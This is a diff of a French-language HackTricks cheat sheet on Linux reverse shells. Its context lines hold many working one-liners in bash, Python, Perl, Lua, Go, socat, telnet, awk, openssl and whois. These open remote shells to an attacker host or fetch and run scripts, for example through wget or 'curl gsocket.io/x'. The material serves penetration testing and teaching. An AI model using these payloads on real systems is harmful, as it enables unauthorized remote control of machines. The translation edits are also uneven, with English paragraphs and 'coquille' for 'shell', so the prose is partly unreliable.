@@ -4,11 +4,11 @@
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks :
+Autres façons de soutenir HackTricks:
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
@@ -16,7 +16,7 @@ Autres façons de soutenir HackTricks :
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -41,9 +41,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Shell sécurisé par des symboles
+### Coquille sûre de symboles
 
-N'oubliez pas de vérifier avec d'autres shells : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
+N'oubliez pas de vérifier avec d'autres coquilles : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -67,11 +67,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Avancé
 
-Lorsqu'il s'agit d'une vulnérabilité d'**Exécution de Code à Distance (RCE)** au sein d'une application web basée sur Linux, l'obtention d'un shell inversé peut être entravée par des défenses réseau telles que des règles iptables ou des mécanismes de filtrage de paquets complexes. Dans de tels environnements restreints, une approche alternative consiste à établir un shell PTY (Pseudo Terminal) pour interagir plus efficacement avec le système compromis.
+Lorsqu'il s'agit d'une vulnérabilité d'**Exécution de Code à Distance (RCE)** au sein d'une application web basée sur Linux, l'obtention d'un shell inversé peut être entravée par des défenses réseau telles que des règles iptables ou des mécanismes de filtrage de paquets complexes. Dans de tels environnements restreints, une approche alternative consiste à établir un shell PTY (Pseudo Terminal) pour interagir de manière plus efficace avec le système compromis.
 
 Un outil recommandé à cette fin est [toboggan](https://github.com/n3rada/toboggan.git), qui simplifie l'interaction avec l'environnement cible.
 
-Pour utiliser toboggan efficacement, créez un module Python adapté au contexte RCE de votre système cible. Par exemple, un module nommé `nix.py` pourrait être structuré comme suit:
+Pour utiliser toboggan de manière efficace, créez un module Python adapté au contexte de RCE de votre système cible. Par exemple, un module nommé `nix.py` pourrait être structuré comme suit:
 ```python3
 import jwt
 import httpx
@@ -128,7 +128,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet est un protocole de communication réseau qui permet d'établir une connexion à distance avec un hôte pour accéder à sa ligne de commande. Il est souvent utilisé pour le débogage et la configuration à distance.
+Telnet est un protocole de communication utilisé pour se connecter à distance à un serveur, un routeur ou un commutateur. Il permet d'accéder à une interface en ligne de commande pour exécuter des commandes et configurer l'appareil distant.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -149,7 +149,7 @@ export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X
 ```
 ## Python
 
-Python est un langage de programmation polyvalent largement utilisé dans le domaine de la cybersécurité en raison de sa simplicité et de sa lisibilité. Il est souvent utilisé pour automatiser des tâches, créer des scripts et développer des outils de hacking. Python offre de nombreuses bibliothèques et frameworks qui peuvent être utilisés pour des activités de hacking, ce qui en fait un choix populaire parmi les hackers et les pentesteurs.
+Python is a versatile programming language that is commonly used in the hacking community due to its simplicity and readability. It is often used for writing scripts, automating tasks, and developing tools for various hacking activities. Python's extensive libraries and frameworks make it a popular choice for hackers of all skill levels.
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -158,8 +158,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 ## Perl
-
-Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. It is commonly used for system administration, web development, and network programming. Perl scripts can be used for various tasks, including automating repetitive tasks, parsing and processing text files, and creating web applications. Perl is supported on a wide range of platforms, making it a versatile tool for hackers and developers alike.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -198,7 +196,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 ## Lua
 
-Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation de tâches, la création de scripts et le développement de jeux. Lua est également largement utilisé dans le domaine de la programmation embarquée en raison de sa taille compacte et de sa facilité d'intégration.
+Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation de tâches, le prototypage rapide et le développement de jeux. Lua peut être intégré à des applications plus larges pour offrir une plus grande flexibilité et extensibilité.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -206,8 +204,6 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 ## NodeJS
-
-NodeJS est une plateforme open-source basée sur le moteur JavaScript V8 de Chrome, qui permet d'exécuter du code JavaScript côté serveur. Il est largement utilisé pour créer des applications web rapides et évolutives. NodeJS utilise un modèle asynchrone basé sur des événements, ce qui le rend efficace pour les opérations d'entrée/sortie intensives.
 ```javascript
 (function(){
 var net = require("net"),
@@ -275,12 +271,18 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Shell inversé
+### Shell inversée
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
+
+Awk est un langage de programmation et une commande de traitement de texte très puissante sous Linux. Il est souvent utilisé pour traiter des fichiers texte en extrayant et en manipulant des données. Voici un exemple simple d'utilisation d'Awk pour afficher la première colonne d'un fichier CSV :
+
+```bash
+awk -F ',' '{print $1}' fichier.csv
+```
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -302,41 +304,22 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 
 ### Introduction
 
-Gawk est un puissant outil de manipulation de texte en ligne de commande. Il est souvent utilisé pour extraire et traiter des données à partir de fichiers texte de manière efficace.
+Gawk est un langage de programmation interprété qui est souvent utilisé pour le traitement de fichiers texte et la génération de rapports. Il est également largement utilisé dans les scripts shell pour traiter des données structurées.
 
 ### Utilisation de Gawk
 
-Pour utiliser Gawk, vous pouvez exécuter la commande suivante dans un terminal :
+Gawk peut être utilisé pour extraire et traiter des données à partir de fichiers texte en utilisant des expressions régulières et des opérations de traitement de texte avancées. Il peut également être utilisé pour effectuer des calculs mathématiques simples et pour formater des données pour l'affichage.
 
-```bash
-gawk 'pattern { action }' file.txt
-```
+### Exemples d'utilisation de Gawk
 
-- `pattern` définit le modèle à rechercher dans le fichier.
-- `action` spécifie l'action à effectuer lorsqu'un modèle est trouvé.
-- `file.txt` est le fichier à traiter.
+Voici quelques exemples d'utilisation de Gawk :
 
-### Exemples d'utilisation
+- Extraction de colonnes spécifiques à partir d'un fichier CSV
+- Recherche et remplacement de texte dans un fichier
+- Calcul de la somme ou de la moyenne des valeurs dans une colonne de données
+- Formatage de données pour l'affichage dans un rapport
 
-1. Afficher les lignes contenant un certain mot :
-
-```bash
-gawk '/mot/' file.txt
-```
-
-2. Afficher la première colonne de chaque ligne :
-
-```bash
-gawk '{ print $1 }' file.txt
-```
-
-3. Calculer la somme d'une colonne de nombres :
-
-```bash
-gawk '{ sum += $1 } END { print sum }' file.txt
-```
-
-Gawk offre une grande flexibilité pour manipuler des données textuelles, ce qui en fait un outil précieux pour les tâches de traitement de données en ligne de commande.
+Gawk est un outil puissant pour le traitement de fichiers texte et peut être utilisé de manière créative pour automatiser des tâches de manipulation de données.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -390,7 +373,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -402,7 +385,7 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
